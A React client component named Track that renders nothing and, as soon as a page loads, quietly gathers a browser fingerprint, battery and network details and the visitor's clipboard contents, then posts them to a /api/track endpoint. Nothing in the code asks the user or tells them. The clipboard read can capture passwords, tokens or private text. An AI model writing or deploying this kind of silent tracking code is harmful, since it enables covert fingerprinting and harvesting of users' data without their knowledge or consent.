"use client";

import { useEffect } from "react";

// Example imports — adjust paths/names as needed:
import {
  generateFingerprint,     // e.g., gathers userAgent, platform, hardware, GPU, etc.
  getBatteryInfo,     // returns battery info if supported
  getClipboardData,   // attempts to read the clipboard (requires permissions)
  getNetworkInfo,     // fetches navigator.connection data
} from "../utils/fingerprint";

export default function Track() {
  useEffect(() => {
    async function captureAndSendData() {
      try {
        // Parallel calls: gather multiple data points at once
        const [
          fingerprintData,
          batteryInfo,
          networkInfo,
          clipboardData
        ] = await Promise.all([
          generateFingerprint(),
          getBatteryInfo(),
          getNetworkInfo(),
          getClipboardData()
        ]);

        // Build the final payload
        const trackingPayload = {
          timestamp: new Date().toISOString(),
          fingerprint: fingerprintData, // or spread directly if you prefer
          battery: batteryInfo,
          network: networkInfo,
          clipboard: clipboardData,
        };

        // Send to your API
        await fetch("/api/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(trackingPayload),
        });
      } catch (error) {
        console.error("Tracking error:", error);
      }
    }

    captureAndSendData();
  }, []);

  return null;
}
